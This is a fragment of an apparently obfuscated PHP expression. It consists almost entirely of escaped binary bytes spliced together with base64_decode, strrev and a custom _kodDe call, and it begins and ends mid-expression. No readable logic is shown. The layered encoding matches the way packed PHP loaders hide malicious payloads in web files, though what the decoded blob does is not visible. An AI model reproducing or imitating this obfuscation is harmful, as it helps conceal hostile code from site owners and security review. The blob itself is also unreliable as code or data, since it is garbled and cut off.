\xf1\x68\x47\x28\x18\x6e\x8f\xab\x6d\x81\xb6\x2e\x81\x13\x9".base64_decode('dEMEiUR6LmX5nfgqEjnjXKWmwoBBzKHFUpl+RhW8GG1hdCBgaC5WSpKWqGzSl7kAyfbreQ==').strrev('tà\\ÛHS£iVœb j+÷Àl$q`Í$1ÁÕ–”"ìW%zŸÑÔ{ÛŒí¢Ø¶')."\305\321\42\42\322\320\10\4\210\366\23\121\2\31\21\370\214\201\226\244\222\35\140\325\111\13\315\243\32\355\11\306\2\130\157\251\256\214\105\43\235\220\141\44\253\263\12\204\240\373\353\330"."\xce\x13\xd4\x97\xb6\x58\xd9\xb5\x9c\xa1\x31\x3d\x96\xe8\xf4\x75\x26\xeb\xca\x13\xe9\xf\xda\x74\x33\x91\xbe\xc0\xba\x7b\x10\x4b\x37\x4c\xae\x65\x81\x34\x9a\xf\x4c\x32\x31\xcb\xfc\x33\x83\xa6\x9\x45\xe7\xf0".base64_decode('Xmucrbhc77nOYtQxytbqWeNsTQCajS4PRlRGUjQmkSEFBGOxaAx6wjaHmM6LJsaCcbZM4g==')."\xf5\xc7\x60\xfd\xe4\xf7\xcd\x2\xf2\xd5\x91\x10\x7\x9f\xf7\x9f\xd2\x3f\x32\xab\xae\xcf\x3b\xcb\x37\x80\x2\xf5\x33\x97\xd1\x28\xc4\xfa\x7d\x8e\x28\x93\xad\xcb\x25\x9e\x1b\x4f\xf5\x3a\x6b\x69\x7d\x73\xbf\xbf"."\337\137\267\264\271\57\340\335\240\171\67\64\170\27\172\7\220\104\136\77\13\0\3\33\233\74\163\66\141\4\204\270\164\372\0\372\151\351\137\72\243\337\173\342\251\153\227\365\365\17\324\66"."\xcf\x9a\xd6\xef\x9b\xde\x3f\x32\x30\xb3\x7e\x29\xfb\x4e\xb2\x5c\x42\x42\x3f\x63\xfd\xa8\xaa\xa9\x59\x75\xa8\x4a\x68\x6b\xca\x51\xa\x12\x47\x23\x8\x2c\x61\x83\x51\x14\xd0\x8d\xf3\x36\x31\x38\x1a\x43\x3d\x23"."\x72\xf4\x79\xfb\x67\xd\x2c\x95\xf2\x49\x20\xf7\xb7\xd0\x92\x84\x4\x98\x2c\xc7\xb\x78\xd7\xe0\x96\xf1\xac\x78\xc2\x3\x7d\x94\xb\x49\xb1\xbe\xe3\x9\x31\xa8\xf1\xfd\x5d\xa6\x20\xf6\x51\x76\x89\xeb\x41\x87"."\21\221\212\305\152\343\14\372\273\211\15\144\106\207\331\116\316\100\112\100\235\345\202\261\236\155\150\12\372\172\10\230\66\43\354\101\335\36\321\31\171\40\270\43\216\210\203\55\240\50\111\212".base64_decode('5aTFlyisOI1yYjKKKt7bjfAYWo9hnA4HbCupFfW41EJVTQRaw0GVsRZgwSxO2GErPy1BTQ==').base64_decode('E6yUMQZJGUWUQzDlrfU5hXAEuqlqJgdHVrmI90cKGnHUtwqShJSWJQrtcsinygNQ5PserA==')."\xcd\xd4\xc5\xa4\xc7\xac\x9\xea\x54\x14\x23\x64\xa1\x2d\x9\xdb\x14\xf8\xeb\xfa\xfb\xcb\x7d\x7a\x6a\xa0\xf\x11\xbe\xe6\x4d\xf\x6c\x9c\xbd\xa9\x9e\x69\x4c\xfc\xfd\xe8\xf\x8b\x4\xaa\x1c\x61\xa8\x9c\xd\xaa"."\110\300\365\341\172\160\125\265\43\302\223\151\324\54\361\235\105\321\261\177\267\115\133\313\71\212\110\140\10\14\56\227\174\101\151\113\107\73\54\70\26\226\205\245\263\37\302\107\43\134\111\312"."\x25\x4a\xe9\xf0\x1\xe7\x88\xeb\xb6\x8f\x63\x78\xa4\x44\x15\xc5\x1d\xe7\x70\x2d\x35\x30\x4b\x8c\x2\x9a\x4e\x6d\xd2\x1a\x47\x55\xe7\x71\xb2\xed\x77\x1c\x18\x59\xba\x56\x4a\x66\x3b\xca\xb9\x9c\xcd\xb5\x2d\x39"."\x63\x8\xbe\x0\x73\x5\xce\xaf\xbc\xf4\x47\x99\x55\x2d\x6b\x87\x59\x62\xa\xc8\x99\x50\x8d\x9a\x99\xd5\x10\x43\x85\x82\x99\x1a\x94\x49\x4d\xac\xae\x9d\x1\x24\xc7\x24\x94\x3a\x76\xd6\xa2\x84\x22\x4a\x6b\x34"."\32\16\6\42\12\136\310\141\1\102\122\102\74\330\23\100\253\27\126\145\306\23\301\30\205\207\332\275\254\334\125\136\246\303\340\1\3\272\335\54\122\1\134\267\325\234\311\230\207\123\13\202".base64_decode('92YerIvwYKHCg2rtweoLj9j5esQRhmfY0EdIgO9KPbBZ9QjFCwRD7R7DaiebbvIBksSqYA==')."\x67\xb1\x66\x39\xa7\x8d\x79\x68\x75\xc2\xfa\xb0\x9e\xf3\x30\x95\x8c\x87\xd5\xd1\xc3\x14\x51\x1e\xa2\x40\x6a\x87\x6a\xf5\xa2\xe9\x4\xd5\x22\x41\xc4\x35\xb3\x1e\x4c\x40\x98\x7e\x3d\xe2\x50\xc5\x63\x8e\x14\xf4"."\x12\x41\x81\x8e\x11\xfb\x75\x8f\xd8\xcb\x7b\x32\x25\xb3\x5c\xec\x61\xdf\x94\x62\xb4\x5a\x0\x10\x75\xe6\x80\x98\x69\xda\x1e\xa6\xdb\xf2\xc8\x4a\x2e\xa8\x45\x80\xcd\x93\xaa\xdd\x59\xbd\x35\xa4\xff\xdd\x95\x0"."\372\302\111\225\275\364\71\203\125\71\36\116\375\336\106\132\42\50\63\67\261\125\316\201\103\364\154\134\354\304\35\56\102\53\304\104\305\15\350\320\340\370\216\26\53\207\71\201\26\234\204\52"."\316\117\304\311\231\20\162\335\132\30\367\231\32\376\50\332\211\304\245\317\331\132\206\175\13\63\53\276\117\251\202\112\303\61\75\71\226\24\152\235\166\111\131\344\214\225\121\11\161\55\355\152".base64_decode('lofMo2pzoPoYc7rmQ3LE4YezPmbEzsfXMUc+f3ZCuwgLjBaFEEEri9lwHC1qHTnWKU1yMg==').base64_decode('MGCPM4Ynl48wZHJKHedKw3CwI6GcFEXcyzBVmkfFyAr5xywojrJZdyktJF3EtUKKQtYiTg==')."\277\266\245\206\175\244\306\221\135\220\211\263\22\36\26\165\174\115\214\270\334\11\230\34\110\363\305\352\304\100\121\261\30\226\101\362\323\54\330\174\141\225\53\204\164\6\23\103\53\323\245\304"."\156\4\200\325\313\361\135\34\25\163\212\221\204\202\77\0\5\20\131\5\263\24\257\230\35\122\324\331\345\56\212\164\55\241\270\213\172\214\302\230\121\210\33\170\157\356\206\216\363\125\130\10"."\1\170\162\213\30\245\312\251\302\164\21\301\252\57\132\276\7\216\200\75\71\243\60\44\55\320\102\263\211\152\217\263\112\165\207\222\134\65\207\202\44\24\321\3\60\237\201\342\263\132\111\164".base64_decode('JuNCmBXwNlgYRUQltLQ2LAQURx6Jl1j2GKu9HHQWSqPtHvLbhSovT1c+PJiPMCTKghAvCA==')."\243\276\102\77\244\41\11\323\203\165\367\350\207\56\343\314\32\200\40\61\272\57\347\333\341\54\0\207\127\40\6\0\204\203\73\274\216\61\20\20\46\124\111\27\300\31\220\123\34\240\65\11"."\160\366\216\344\365\34\132\315\112\76\74\107\72\361\232\304\372\204\262\67\231\346\342\72\152\47\24\57\112\210\127\244\311\330\102\207\212\331\275\130\36\370\1\30\237\142\242\177\305\174\312\210"."\12\341\356\124\53\353\201\51\270\172\274\243\144\162\341\226\257\354\156\244\66\262\173\344\106\35\256\325\130\352\17\207\4\121\1\222\362\270\145\11\27\324\25\305\362\205\153\132\13\36\310\224"."\143\364\70\246\104\27\60\37\332\23\200\215\216\247\101\22\267\4\237\331\110\217\304\140\301\333\344\32\147\333\64\321\106\263\344\53\241\57\213\12\111\74\16\30\4\261\323\300\353\240\54\44"."\360\122\54\224\40\161\153\247\54\304\162\306\213\32\143\322\134\116\143\324\113\166\25\145\301\70\111\225\105\175\170\55\150\102\230\13\267\230\75\4\123\206\215\41\170\276\231\354\34\110\40\212"."\25\322\235\131\304\145\226\115\126\236\212\261\27\73\7\317\14\7\246\123\132\0\340\114\262\244\373\204\160\123\335\64\51\151\26\201\40\44\163\275\274\71\254\113\100\174\356\126\24\51\122\224"."\x26\x4b\x49\xa2\x50\x9\x8b\x8f\x11\xa9\x11\x9a\x5e\x29\x22\x12\x8b\x5e\x20\xb8\x90\x97\xec\xa7\xe9\xc\xf6\xe1\x1d\x84\x4f\xf4\x72\xa8\x3d\x50\x2a\x31\xfa\xa5\xcd\xc4\x67\xc2\x8\x28\x83\x30\xfb\x8b\xb3\xc9"."\127\155\271\242\205\7\207\205\61\36\55\12\177\330\107\147\77\76\170\214\26\230\344\51\205\53\121\145\245\142\365\202\342\342\360\335\31\253\216\36\310\345\204\311\224\73\76\145\26\72\353\345".base64_decode('TDJkymwdZDPLLA2qwfg2ZmrR3H0A7uTUU4ssbG66dxx8GKvH0eLcljUKOlO5pI2SVY1l/Q==').base64_decode('f5aNK3sez5CpyAWnSepnbBQ8rMt7Bq5qFSyKr9rjblkE5AEpotoOkSpGypemk4NC0PSl/Q==')._kodDe('Kkt1RKBbyDVBYqdiMDZP1mxTHNlcLECD/VCZBJwy1ZP3IgstuAMNIsWMQqKejSCmi7tZa20=')."\74\174\23\15\77\271\353\211\333\336\170\213\206\347\67\55\244\201\361\375\307\17\142\272\37\141\25\176\316\252\61\363\337\176\372\325\316\63\376\276\161\301\5\336\272\165\135\361\232\31\227\165".base64_decode('D1z72rSTvzvqnfFh9pHj3vnl5UO/fMeTyQRj7y/teOUnH04PXvjwsoH7shd/LXvGvOHTDw==')."\x39\xfc\xfa\x9b\xff\xeb\xf6\xe6\xbf\x78\x9b\x77\x59\x6f\xf9\x8c\xdb\xce\xbc\xf9\x3b\x63\x7f\x4d\x4f\xfe\xc7\xee\x91\xcd\xf7\x44\x1f\xfb\xc7\x9e\x8f\xa2\xa7\x36\xb4\x8f\xee\xd7\xf3\xc5\xc8\x1\xfb\x5e\x78\x6b"."\277\65\327\56\173\254\151\306\344\221\107\36\22\174\141\207\47\262\377\215\57\176\241\177\311\337\173\32\356\213\47\357\377\311\277\206\217\71\162\343\161\133\76\74\377\230\215\13\316\76\73\32"."\x7b\x51\x3f\x23\x38\x71\xc0\x61\x75\x27\xfe\x65\xc1\xd8\xcf\x4e\xde\x1e\xba\xf9\xac\xfa\xcd\x77\x2c\xe8\xe9\xdb\x70\xff\x3b\x27\x77\xbf\xf9\x66\xe7\xa3\x87\xd4\xfe\xfe\x81\x81\xaf\xfc\xf2\x9e\x3f\xfc\x6c\x97"."\367\260\57\132\327\35\363\263\33\256\232\375\305\123\67\364\375\153\155\367\345\37\356\335\61\60\161\340\326\147\167\117\234\264\70\173\137\337\370\43\257\344\336\275\362\333\33\56\77\366\203\113".strrev('êçı_é“IÚükIúr>«Q÷Üy¿ôµãÌõ¢{ıÉî¼Ï¼"ü×Çïwùyn_‚üÑS')."\x4f\x8d\x97\x97\x6c\x7d\xa5\xeb\xfb\x43\x37\xbc\x66\x9c\xfa\xe3\x55\x87\x16\x77\xfd\xac\xfe\x37\x47\x1f\x60\x75\xed\x7c\xe9\xde\xe7\x8e\xfb\xe3\xa6\xf5\x73\xe6\xee\xe8\xeb\x7f\xf6\xee\x2b\x2e\x7a\xa5\xf5\xa7"."\17\105\157\171\341\222\75\23\307\56\375\356\175\247\37\170\305\137\147\376\355\250\45\43\323\346\314\232\236\335\74\353\167\307\172\316\215\376\340\150\355\323\206\73\277\164\334\7\237\36\373\225".base64_decode('e7+u/PC1ZfP/e/rTJy7Jn//07ftN++KR2ldmnd11zK714buv+Un6x13ds341OP5w53/8ZA==')."\357\101\107\137\167\331\7\307\65\77\336\361\311\103\265\173\366\273\75\271\353\223\57\137\371\362\121\337\50\75\362\255\47\347\254\270\366\230\303\136\371\326\225\223\307\355\177\300\107\37\174\351".strrev('x%Çy¼Nwì÷|SÆæ`O'."\r".'øsyDó>twëº__Ìoç…æ½_µ¥osË}%…èÿ/ê')."\366\173\47\336\370\360\141\7\376\365\214\267\173\57\75\352\125\275\364\302\160\56\64\143\355\252\257\316\172\372\330\47\167\205\303\157\115\26\336\11\44\13\67\177\357\237\241\322\301\201\145\337"."\x5b\xfd\xde\x95\xb7\x7c\x69\x5e\x7e\xe4\x86\xdb\xff\xfd\xa4\x5f\x77\x5c\xfd\x85\x17\xbf\x72\x62\x6c\xce\x8c\x4b\xbe\x6b\x1f\x94\xae\x79\xe7\xfa\xd7\x9f\xff\xf0\xdb\x97\xbc\x74\xd4\x15\x2f\x7c\xfb\x6b\xeb\x6e"."\xbf\xe7\xc0\x43\x8f\xbe\x77\xfd\x6f\xfe\xfe\xc3\xfd\x6e\x2b\xfe\xfb\xc3\xb\x3b\xe\xbc\xa3\xf1\xd0\xff\x7e\xe2\xc3\x5b\x7e\x74\xd7\x96\x3\x7\x97\x1d\xf5\xcd\x83\x7e\xa5\x5f\x78\x88\xb1\xef\xb9\x89\x73\x6e".base64_decode('b1WW3rc49dz6K7/w9fMbR86+q7jmGy/9rH+/N7697/pDj7y2uOeAuw+PTrvwz9/f/wsdFw==').base64_decode('zZ0/76inj7i65dgzAyflR+684M4Hl50eq/nr3V3F73ubNo0Nn71vybeWf+mJE1Y+/92dew==')."\176\134\167\360\212\143\232\326\36\262\373\224\232\163\277\276\127\261\107\63\147\17\174\60\371\320\263\127\376\372\212\326\345\271\365\57\37\167\121\340\332\273\256\30\354\10\55\10\234\177\214\235"."\130\374\353\47\317\275\363\250\105\372\326\223\237\137\64\361\351\215\13\216\70\346\246\325\337\233\274\361\366\311\306\137\377\274\376\237\337\172\257\163\371\331\307\165\205\247\55\71\256\176\311\332"."\xeb\x67\xe\x35\x3c\x16\x7f\xe5\xf4\x4d\x7d\x13\xd9\xc8\x73\xf5\xb7\xee\x4b\x9c\xfe\x50\x7f\x4b\xee\xbe\xbf\x95\xee\x7d\x69\xc9\xf3\xff\x96\x8f\x2c\xfa\xfe\xdb\xfb\x1e\x1d\xde\xb5\x7b\xd5\x8e\x2f\x15\xcf\x7b"."\361\330\306\313\356\77\260\376\127\33\236\271\146\331\300\2\375\57\27\235\371\203\143\17\177\352\341\273\142\103\67\177\255\65\364\321\2\375\314\373\376\166\103\340\365\13\237\172\374\350\237\36"."\xf5\xe2\x31\x9e\xa5\x5f\xf9\xf9\x17\x4c\xfd\xf2\xfe\x35\xcb\x1f\xca\x9d\x9e\x39\x66\xf2\x92\xb3\x5e\xfd\xc1\x19\x8f\x2e\x7c\xb3\xa5\x63\xce\x45\xc7\xdd\xfa\x66\x67\xed\x93\xef\x6f\xbd\xfb\x94\x2b\x1f\x8a\x1e"."\362\361\257\72\342\353\375\336\273\127\175\367\361\235\205\133\317\273\343\322\267\236\331\276\372\77\264\103\317\275\355\335\353\365\103\143\305\375\366\116\273\364\223\167\327\136\60\353\245\137\335\363"."\321\253\313\177\363\346\157\216\150\371\151\303\365\271\376\235\177\276\374\317\201\233\233\126\317\311\75\165\237\171\347\212\300\7\315\35\135\73\355\3\217\71\363\251\276\327\336\173\174\236\376\362".base64_decode('e4MDv/veU+axh27NzP/1zxuXXvXsF1/u/WTnb19IqB03H3zBI+b2/3p336NrHv3tXe+ffQ==').strrev('Ğì:Ÿ½çMÕö»Ç{LöOaö~ÜôÔŞÖ“ô\\ñ±1ôşæ¸=f—”ù³75šŞs©¸~ÿôĞ').strrev('öw[{ÕtúÎõìÍ£ŞÈñVÙuõòÿ§»ÁÔ¿·§-àüù<·ãÜÏpèğ|ïî«Ö').base64_decode('/33oZ8/9sClw/djwyY+tffWRJ/aO/FfjMx93aFZZf3vy579YkFkW0zN3/qFts+/U9996bQ==')."\xcb\xd2\xdd\x1b\xde\x7f\xf1\xae\x17\xa3\xfe\x7f\x7d\xfc\xb7\x57\xf6\xfa\xb7\x9d\xb2\xfb\xd4\x77\xff\xf4\xfe\xca\xbd\xfe\x7f\xad\xff\xf4\x8f\x17\x5d\xf4\xec\xa7\xa5\xf\xff\xf2\x9b\x89\x77\x4f\xbb\xfb\xf1\xda".base64_decode('j/9x6fEf/3DLoXv+Hr387y8kn709EZ4W+e/pb7b+vLhk2zmPd2UOn/5Wix644j/Wrnr5oA==')."\361\303\36\376\355\346\3\17\332\274\376\260\107\257\332\167\351\272\334\356\163\136\131\335\67\357\107\77\131\162\326\367\237\354\17\355\70\177\162\116\303\301\137\77\351\230\207\16\276\344\222\324"."\207\75\365\321\133\366\155\63\272\277\225\376\303\300\352\215\367\15\17\365\372\47\332\137\376\305\327\347\175\153\353\17\266\176\353\255\27\357\137\367\124\323\361\167\74\175\321\73\213\36\133\162"."\271\366\324\311\227\17\374\340\334\365\317\305\67\137\246\136\220\230\70\350\215\55\251\3\277\164\135\307\351\213\257\370\362\232\124\323\75\107\334\375\367\205\117\377\241\341\365\145\277\256\231\126"."\x77\x80\x96\xf9\xd1\xf0\x93\xc1\xb\xfe\xda\xf1\x76\xd7\xd5\xbd\xdb\xe7\xef\xfa\x46\xdc\xfb\xde\xe2\x70\x76\x8d\xff\xb8\x8f\xbe\x73\xfc\xeb\xcb\x32\x8f\x5f\x7e\x49\x73\xed\x49\x81\xd6\x3f\xa6\x76\x99\x1f\x1d"."\125\273\244\320\362\323\123\77\175\366\211\255\312\342\325\7\75\370\273\225\277\373\345\67\376\372\237\263\27\236\32\116\277\271\160\353\67\216\274\375\220\207\126\156\153\271\363\213\177\137\376\215"."\5\213\26\75\177\146\341\266\105\117\277\173\337\77\236\175\340\13\277\134\33\173\153\376\53\127\25\132\72\377\264\257\256\63\372\316\326\314\15\117\331\363\336\170\373\267\377\174\170\345\135\53"."\xbf\xfc\x4c\xf8\x81\xd2\x3b\x9f\xfe\x61\xb2\xf0\xec\x77\x1f\xf5\xed\xbe\xe3\x83\x5f\xbe\xfc\xa7\x93\xbe\xbf\xe6\xeb\x4f\xdc\x18\xd3\x12\x57\x3f\xd9\x79\x4f\x48\xab\xfd\xc9\x57\x2f\x6b\xb1\x3e\x3c\xfb\xfe\xe5".strrev('5ñøpŸ§Æıÿ¯—¯åiµ_ïL'."\r".'ÕäûÏóãÇr—7mVË­ívİ]GóÁø~;uñ¾W')."\x7f\xbc\xe8\xcd\x6b\x7b\x4f\x35\x2e\xbe\x25\xba\xff\xf7\xaf\x3c\x38\x75\xc7\x5b\xf9\xd6\xa3\xf7\xff\xf2\xdd\x99\xbb\x57\xdc\x34\xf7\x84\x83\x6e\x3a\xe0\xcb\xc5\xb3\x94\x97\xee\x7e\xb0\xa1\x77\xe1\xb\x7f\x3e"."\157\127\356\37\307\166\35\362\323\350\57\156\335\271\370\202\247\277\331\164\306\312\310\101\177\70\366\345\331\257\170\17\155\172\262\373\267\371\47\147\137\370\352\55\207\277\334\164\261\326\226\334"."\176\154\233\347\233\317\337\133\77\376\356\371\267\56\336\235\137\175\122\323\277\137\374\212\357\236\127\317\171\257\373\323\225\323\273\227\377\243\376\344\373\214\373\37\170\346\307\233\157\371\143\360"."\262\347\216\173\370\117\177\336\375\361\63\347\316\176\251\371\207\327\235\167\334\255\373\346\334\253\315\234\75\355\314\71\137\355\170\374\340\354\73\257\234\172\365\243\221\127\123\107\266\157\275\376"."\226\157\76\331\65\157\311\342\133\137\320\12\33\207\166\350\201\57\165\352\7\357\330\357\353\237\136\365\104\263\377\254\366\311\147\332\57\271\277\167\227\136\370\342\274\273\236\274\172\371\57\176"."\x7f\x6a\x72\xc3\x69\xf3\x47\x7e\x7b\xdb\x6d\x87\x6\x9e\xfb\xe1\x4f\x7f\xba\xe8\xc7\x1f\x2d\x34\xbf\xb2\xe7\xed\xb7\x5f\xff\xe4\x93\x52\xe6\xcc\xdb\x67\xfc\xe0\xc5\x97\xdf\xbf\xe0\x8e\x2d\x93\x5f\xbb\xab\x78"."\305\73\17\214\75\373\352\375\351\314\1\157\175\371\57\177\75\347\321\263\326\75\232\350\37\330\370\267\256\143\357\77\370\271\217\226\304\226\354\330\372\320\73\201\256\253\17\273\340\350\173\75"."\7\336\164\332\53\261\300\247\157\277\367\154\332\167\316\47\345\205\357\76\245\67\276\30\333\377\205\253\166\265\37\372\373\257\176\322\71\177\373\345\27\53\347\377\353\135\373\211\266\321\266\127"."\37\234\361\330\53\353\316\133\174\327\235\355\227\75\62\343\356\325\172\303\5\77\272\363\216\310\214\326\325\275\276\233\376\365\311\153\57\255\374\372\356\117\76\376\323\323\352\215\247\375\355\375".base64_decode('D0871fr0z7XXHL901wc/Xrp705/f+PBe/49rTn3/bx9O7H7s8NN2f/jCxF3XXHPTqaOfvg==')."\xf9\x5f\xdf\x39\xed\x2f\xcf\x4f\xbc\x78\xda\xae\x7f\xbe\x76\xef\xbf\x3e\xfd\xc8\x3a\xe5\xb7\xc1\xb9\xa7\xdd\x74\xff\xec\x96\xc3\x9e\x59\xf8\xe6\x3f\xc6\xbf\xb9\xe2\x99\x7f\x1b\x29\x3c\xf2\x8b\x17\xff\x70\xaa"."\372\273\361\73\142\133\177\63\362\217\157\176\164\350\57\176\274\142\327\13\157\33\237\334\372\372\25\33\377\161\374\351\147\150\255\103\13\356\71\176\313\145\257\17\232\255\343\337\274\41\222\371"."\xeb\xbd\xbf\xff\x67\xc7\x63\x3b\x1e\xba\x7f\xc0\xa3\xbf\xf3\x71\x4f\x76\xe6\xf8\x8c\x58\xc3\xbf\x36\x4f\xfb\xdb\x41\x37\x4e\x1c\xaa\x2d\xfe\xad\xf7\x6b\x9e\x87\x6f\x7d\x6d\x79\x57\xd3\xe\x3d\xf7\xef\xdf\x4c"."\371\146\53\366\353\27\346\177\124\374\170\351\171\75\163\147\377\345\130\166\253\255\161\76\30\200\65\66\302\211\352\374\106\200\244\313\243\132\152\303\72\32\201\353\71\215\115\140\70\64\147\376".base64_decode('XCZRQb65jWAu1UR/NqSyw8U0qI8AefZcwFmf1NJjw5A4Zy6UPpbNawUTzpTXpa1swdgAew==')."\227\214\235\64\6\1\77\127\30\35\62\15\120\263\145\212\166\51\307\54\132\240\364\205\13\241\16\363\340\267\60\144\147\262\33\40\307\234\331\320\206\271\13\240\132\143\103\346\360\240\6\237"."\112\27\365\174\156\3\354\106\240\53\12\231\262\136\62\41\77\313\276\260\1\2\303\166\106\37\113\302\36\256\151\76\130\200\316\153\4\121\263\264\301\314\346\312\320\52\175\320\336\220\111\256"."\147\365\204\12\317\237\3\231\326\25\121\65\63\114\363\232\317\330\132\31\276\72\70\242\25\363\46\154\251\233\130\217\55\140\275\77\62\244\133\305\34\340\56\130\10\311\132\156\375\120\312\6"."\x6d\xe6\xec\x46\xe8\x8d\x41\xad\x38\x52\x62\x97\x81\xec\x74\x61\x6c\x74\xfd\x8\x1b\x1f\xa8\xb3\x9d\x2a\x59\xb9\x2\x58\x46\xcf\x9f\xf\xd0\xf4\x58\x26\x95\xdd\x0\x75\x48\x22\xf2\xc8\x30\x23\xc8\x85\x73\x17"."\xb0\xce\x85\x96\xc\xa7\xf5\x82\xb5\x7e\x10\xca\x6d\x9a\xf\x5d\xde\x0\x5d\x5e\x34\xd3\xeb\x86\xf3\x50\xd4\x3c\x96\x3a\x9f\x8d\xc\xeb\x8f\x42\x76\x24\x95\xdf\xc0\xac\xfa\x32\xfa\xfa\xb1\x2c\x44\x34\x2b\x9d"."\xcf\xa6\x98\x12\x6c\x83\x55\x1c\x5c\xf\x7b\xa0\x75\x5a\x6e\x28\x6d\xb2\xe3\x9f\x5c\x32\xab\xd\x33\x3d\x5c\xc6\x2c\x17\xd7\xc1\xa9\x77\xda\x36\x32\x43\x49\x18\xe7\xb9\x4d\x30\x12\xda\x68\x66\x58\x1f\x61\xfa"."\x90\xc1\xf4\x68\x6e\xc\x3a\x6a\xce\x1c\x40\x19\x2a\x1b\xe6\xe8\x6\xa6\xea\xcf\xc\x17\xb8\xfd\xc5\x68\x4e\x1f\x2b\xb2\xcb\x3e\xc9\xb2\xa5\x19\x19\x18\xf6\xfc\xd8\x60\xd9\xc8\xc2\x40\x8c\x64\x46\xcb\x63\x6"."\xd0\xc0\xb0\x95\x2a\x1a\x25\xa8\xfa\x5c\x36\x9\x9b\xd8\x44\x31\xf4\x91\xf4\xfa\x22\x24\xb3\x39\x57\xd2\x6d\x33\x59\x28\x32\x32\x84\x82\x72\x76\x3e\x39\xa\x1d\x3e\xbf\x11\x28\xa0\x9c\x1e\x1e\x2b\xe4\xa0\x9"."\363\346\261\121\152\342\63\205\317\5\200\314\233\3\203\221\35\66\67\344\107\201\4\32\33\341\53\331\334\150\61\77\4\345\245\363\103\111\104\261\200\262\0\12\67\326\351\303\151\326\360\246"."\171\154\266\314\1\352\153\232\63\217\175\40\125\30\262\140\326\245\320\14\37\321\141\150\346\61\162\51\32\205\321\15\45\150\123\132\267\262\243\303\240\213\114\145\254\15\131\66\310\163\330\104"."\56\150\331\364\372\14\233\247\115\115\214\176\41\71\223\56\145\315\61\240\365\122\312\32\35\321\322\154\114\113\332\272\61\106\357\263\241\57\12\345\241\274\236\206\317\57\150\202\122\232\232\240"."\157\107\314\344\372\301\364\72\326\267\120\347\222\75\250\153\254\250\171\13\240\337\222\226\216\150\231\35\203\224\214\221\274\315\331\21\353\171\66\207\206\13\103\243\143\105\40\243\71\13\1\132"."\52\346\307\114\166\131\301\112\257\333\220\143\144\61\207\261\221\165\311\242\71\310\224\143\172\152\3\242\21\240\262\334\60\112\312\3\137\111\216\215\24\327\215\102\337\65\66\54\144\125\235\315"."\x92\xb3\xba\x96\x33\xd8\xb0\x2d\x64\x64\x6\xed\x5b\x0\x3c\x71\x1\x9b\xa3\xf3\x67\x43\xd\x67\xb3\x2e\x68\xd5\x92\x43\x4c\x91\xcd\x8d\x8f\x65\xab\x5d\x6a\x7f\x46\x35\x86\xf2\xc9\xf\xbb\xcd\x69\x14\x7c\x68"."\x25\xe0\xb6\x3f\x5d\x50\x19\x19\x36\xa4\xeb\xcc\xfe\x1f\x6\xc8\x16\xf6\x24\x60\x30\xc\x70\x23\xaf\xb\xe5\x3c\x3d\x2\x61\x39\x85\xb6\x1\xab\x7a\x24\x8b\x14\x1c\x8d\xcb\xa5\x24\xb\xb6\x94\x8c\x62\x8e\xd4"."\xb8\x7c\x45\x1\x5a\x87\x6b\xe8\x93\x5b\xbd\x3a\xcf\xac\xad\xab\x1c\xa5\x82\x42\xda\xb2\x46\xcc\x12\xf4\xd8\x90\x99\x4a\xe6\xcc\x72\xca\x51\x6a\x6a\xd0\x57\xa5\x27\x69\x4b\xaa\xa5\xa4\xdd\x70\x6e\xb7\x24\xa"."\164\230\342\63\230\243\327\6\311\210\162\43\51\374\7\352\115\357\45\133\330\250\234\137\243\243\330\76\66\60\203\22\71\320\263\5\133\263\206\174\62\330\53\247\32\5\124\337\134\316\347\274"."\251\216\257\214\367\366\250\211\100\174\271\144\174\210\257\64\63\332\121\305\75\13\251\35\142\320\244\36\224\307\316\331\146\106\33\373\266\357\232\330\162\365\344\125\73\46\57\336\66\361\360\25"."\373\266\355\230\170\364\52\24\335\263\363\222\211\155\67\276\161\335\71\173\166\136\274\147\347\351\373\316\273\357\335\107\66\117\154\331\276\357\254\107\47\156\270\163\342\173\347\355\331\365\350\276"."\xdd\xe7\xed\xbd\xf3\xa2\x3d\x3b\xb7\x4e\xde\x70\xc1\xc4\x39\xf\xec\xd9\x75\xf5\xc4\xf9\x37\x4f\x9c\xb7\x65\xf2\x8a\x8b\xf7\x3c\x7a\x3\xc2\x9f\x3c\x5f\x94\x8c\xd0\x26\xb6\x5e\x8b\xf3\x3e\x72\xe6\xc4\xce\x9d"."\373\156\271\223\247\276\373\310\31\264\62\114\34\351\324\155\45\176\162\230\131\224\21\202\124\226\50\100\212\272\345\123\172\162\72\352\61\45\211\357\156\141\363\63\73\253\227\24\233\230\241\151".base64_decode('6G/BLHgpqdFb9pZiFHCywvrax8kxoeeLmKigl/z0uq3jQodEedW6mSZUoSPc12Ks6nAQTg==')."\24\261\336\122\111\153\10\220\152\126\322\50\233\302\56\224\51\266\311\302\371\61\76\350\56\362\257\72\254\274\32\154\150\63\374\370\100\150\265\241\142\322\115\35\172\144\124\101\122\144\76\71"."\231\201\143\246\71\331\210\234\344\354\11\120\73\23\353\7\217\102\253\342\121\310\231\267\342\274\133\216\255\31\230\205\200\74\147\344\352\227\364\142\216\37\176\141\315\155\325\116\164\65\41\136"."\245\273\170\43\34\211\150\76\226\355\52\210\162\257\312\352\154\303\154\313\41\126\46\16\143\125\55\15\67\133\103\5\31\42\132\251\146\164\233\135\136\260\330\214\217\207\332\324\236\0\63\267"."\327\212\105\277\225\32\262\374\330\46\316\30\326\303\306\240\37\337\23\307\264\353\343\67\251\11\351\253\332\240\131\262\331\51\107\31\337\63\146\142\53\266\200\20\35\107\243\102\241\217\232\314"."\171\162\111\117\31\314\102\133\317\23\114\50\320\47\35\247\321\153\140\334\114\74\211\46\140\311\161\122\270\170\151\61\133\304\56\103\354\105\113\341\276\2\273\17\50\325\1\302\342\132\233\14"."\315\271\117\37\371\164\155\157\225\34\167\140\264\146\257\327\53\151\311\205\231\36\16\101\161\342\20\36\301\202\230\227\114\5\157\347\266\51\210\311\144\62\272\145\67\223\33\302\312\54\5\125".strrev('åbPˆ( 